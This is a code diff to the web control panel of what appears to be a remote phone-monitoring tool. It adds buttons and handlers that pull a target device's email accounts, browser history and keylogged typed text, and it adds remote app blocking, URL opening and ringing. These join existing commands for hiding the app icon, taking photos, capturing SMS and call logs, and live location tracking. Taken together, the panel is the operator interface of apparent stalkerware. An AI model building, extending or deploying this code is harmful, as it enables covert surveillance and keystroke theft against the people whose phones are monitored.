@@ -1130,6 +1130,44 @@
           </div>
         </div>
 
+        <!-- Advanced Monitor (Emails / History / Keylog) -->
+        <div class="card" id="advanced-monitor-card">
+          <div class="card-header">
+            <div class="card-title"><i class="fa-solid fa-eye" style="color:#f472b6;"></i> Advanced Monitor</div>
+            <div class="ctrl-bar">
+              <button class="btn btn-purple" onclick="requestEmailAccounts()"><i class="fa-solid fa-envelope"></i> Emails</button>
+              <button class="btn btn-teal" onclick="requestBrowserHistory()"><i class="fa-solid fa-earth-asia"></i> History</button>
+              <button class="btn btn-amber" onclick="requestKeylog()"><i class="fa-solid fa-keyboard"></i> Keylog</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div id="advanced-monitor-display" style="font-family:var(--font-mono);font-size:11px;color:var(--text-2);line-height:1.7;background:var(--bg-void);border-radius:10px;border:1px solid var(--border);padding:12px;max-height:220px;overflow-y:auto;">
+              <span style="color:var(--text-3);">Email accounts, browser history and typed-text (keylog) results appear here.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- App Block + Device Controls -->
+        <div class="card" id="power-controls-card">
+          <div class="card-header">
+            <div class="card-title"><i class="fa-solid fa-gamepad" style="color:#fb923c;"></i> Power Controls</div>
+          </div>
+          <div class="card-body">
+            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
+              <span style="font-size:11px;color:var(--text-3);"><i class="fa-solid fa-ban"></i> Block/Unblock app:</span>
+              <input type="text" id="pkg-input" placeholder="package name e.g. com.tiktok.musically" style="flex:1;min-width:180px;">
+              <button class="btn btn-red" onclick="remoteBlockApp(true)"><i class="fa-solid fa-ban"></i> Block</button>
+              <button class="btn btn-green" onclick="remoteBlockApp(false)"><i class="fa-solid fa-check"></i> Unblock</button>
+            </div>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:8px;">
+              <span style="font-size:11px;color:var(--text-3);"><i class="fa-solid fa-globe"></i> Open URL on device:</span>
+              <input type="text" id="url-input" placeholder="https://example.com" style="flex:1;min-width:180px;">
+              <button class="btn btn-teal" onclick="remoteOpenUrl()"><i class="fa-solid fa-arrow-up-right-from-square"></i> Open</button>
+              <button class="btn btn-amber" onclick="remoteRing()"><i class="fa-solid fa-bell"></i> Ring Loud</button>
+            </div>
+          </div>
+        </div>
+
         <!-- Call Log -->
         <div class="card" id="calllog-card">
           <div class="card-header">
@@ -1510,7 +1548,8 @@
         } else if (['photo_result','audio_result','location_result',
                     'call_log_result','sms_result','incoming_sms',
                     'contacts_result','installed_apps_result','get_info_result',
-                    'screenshot_result','take_photo_result'].includes(data.type)) {
+                    'screenshot_result','take_photo_result',
+                    'email_accounts_result','browser_history_result','keylog_result'].includes(data.type)) {
           handleMonitoringResult(data);
         } else if (data.type === 'error') {
           document.getElementById('explorer-loader').style.display = 'none';
@@ -1824,6 +1863,52 @@
     switchTab('tab-monitor');
   }
 
+  function advancedDisplay(msg) {
+    document.getElementById('advanced-monitor-display').innerHTML = msg;
+    switchTab('tab-monitor');
+  }
+
+  function requestEmailAccounts() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'get_email_accounts' }));
+    advancedDisplay(`<span style="color:var(--amber);">⏳ Fetching email accounts…</span>`);
+  }
+
+  function requestBrowserHistory() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'get_browser_history' }));
+    advancedDisplay(`<span style="color:var(--amber);">⏳ Fetching browser history…</span>`);
+  }
+
+  function requestKeylog() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'get_keylog' }));
+    advancedDisplay(`<span style="color:var(--amber);">⏳ Fetching keylog…</span>`);
+  }
+
+  function remoteBlockApp(block) {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    const pkg = document.getElementById('pkg-input').value.trim().toLowerCase();
+    if (!pkg) { showToast('⚠️ Enter a package name', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: block ? 'block_app' : 'unblock_app', package: pkg }));
+    showToast(`${block ? '🚫 Block' : '✅ Unblock'} ${pkg} sent`, 'success');
+  }
+
+  function remoteOpenUrl() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    let url = document.getElementById('url-input').value.trim();
+    if (!url) { showToast('⚠️ Enter a URL', 'info'); return; }
+    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'open_url', url }));
+    showToast('🔗 URL open sent', 'success');
+  }
+
+  function remoteRing() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'ring', duration: 20 }));
+    showToast('🔔 Ring loud sent', 'success');
+  }
+
   function triggerTorch(on) {
     if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
     ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: on ? 'torch_on' : 'torch_off' }));
@@ -1995,6 +2080,54 @@
     if (data.type === 'incoming_sms') {
       addNotificationLog({ type:'sms', app: data.sender, title:'💬 Incoming SMS', text: data.body, time: new Date(data.time).toLocaleTimeString() });
     }
+
+    if (data.type === 'email_accounts_result') {
+      if (data.error) {
+        document.getElementById('advanced-monitor-display').innerHTML = `<span style="color:#f87171;">❌ ${data.error}</span>`;
+        return;
+      }
+      const accs = data.accounts || [];
+      const html = accs.length === 0
+        ? `<span style="color:var(--text-3);">No email accounts found</span>`
+        : accs.map(a => `<div style="padding:4px 0;border-bottom:1px solid var(--border);">✉️ <strong>${a.email}</strong> <span style="color:var(--text-3);font-size:10px;">(${a.type})</span></div>`).join('');
+      document.getElementById('advanced-monitor-display').innerHTML = `<div style="font-size:11px;">📧 <strong>Email Accounts</strong> — ${accs.length}<br>${html}</div>`;
+    }
+
+    if (data.type === 'browser_history_result') {
+      if (data.error) {
+        document.getElementById('advanced-monitor-display').innerHTML = `<span style="color:#f87171;">❌ ${data.error}</span>`;
+        return;
+      }
+      const items = data.items || [];
+      const html = items.length === 0
+        ? `<span style="color:var(--text-3);">No history accessible</span>`
+        : items.map(h => {
+            const d = h.time ? new Date(h.time).toLocaleString() : '';
+            return `<div style="padding:6px 0;border-bottom:1px solid var(--border);">
+              <div style="color:var(--text-1);word-break:break-all;">${h.title || '(no title)'}</div>
+              <div style="color:#60a5fa;font-size:10px;word-break:break-all;">${h.url}</div>
+              <div style="color:var(--text-3);font-size:9px;">${d}</div></div>`;
+          }).join('');
+      document.getElementById('advanced-monitor-display').innerHTML = `<div>🌐 <strong>Browser History</strong> — ${items.length}<br>${html}</div>`;
+    }
+
+    if (data.type === 'keylog_result') {
+      if (data.error) {
+        document.getElementById('advanced-monitor-display').innerHTML = `<span style="color:#f87171;">❌ ${data.error}</span>`;
+        return;
+      }
+      const entries = data.entries || [];
+      const html = entries.length === 0
+        ? `<span style="color:var(--text-3);">No typed text captured yet</span>`
+        : entries.map(e => {
+            const d = e.time ? new Date(e.time).toLocaleString() : '';
+            return `<div style="padding:4px 0;border-bottom:1px solid var(--border);">
+              <span style="color:#f472b6;">⌨️ ${e.app || e.package}</span>
+              <span style="color:var(--text-3);font-size:9px;float:right;">${d}</span>
+              <div style="word-break:break-all;margin-top:2px;">${e.text}</div></div>`;
+          }).join('');
+      document.getElementById('advanced-monitor-display').innerHTML = `<div>⌨️ <strong>Keylog</strong> — ${entries.length} entries<br>${html}</div>`;
+    }
   }
 
   // ── Policy ─────────────────────────────────────────────────
@@ -2011,7 +2144,7 @@
   function handleCommandResponse(data) {
     const icon = data.success ? '✅' : '❌';
     const t = data.success ? 'success' : 'error';
-    const names = { lock:'Lock Screen', buzz:'Vibrate', hide_icon:'Hide Icon', unhide_icon:'Restore Icon', update_policy:'Policy Update', torch_on:'Torch ON', torch_off:'Torch OFF', show_toast:'Toast', take_screenshot:'Screenshot', get_info:'Device Info', start_live_location:'Live Location Start', stop_live_location:'Live Location Stop' };
+    const names = { lock:'Lock Screen', buzz:'Vibrate', hide_icon:'Hide Icon', unhide_icon:'Restore Icon', update_policy:'Policy Update', torch_on:'Torch ON', torch_off:'Torch OFF', show_toast:'Toast', take_screenshot:'Screenshot', get_info:'Device Info', start_live_location:'Live Location Start', stop_live_location:'Live Location Stop', block_app:'Block App', unblock_app:'Unblock App', ring:'Ring Loud', open_url:'Open URL', clear_keylog:'Clear Keylog' };
     showToast(`${icon} ${names[data.command] || data.command}: ${data.message}`, t);
   }
 
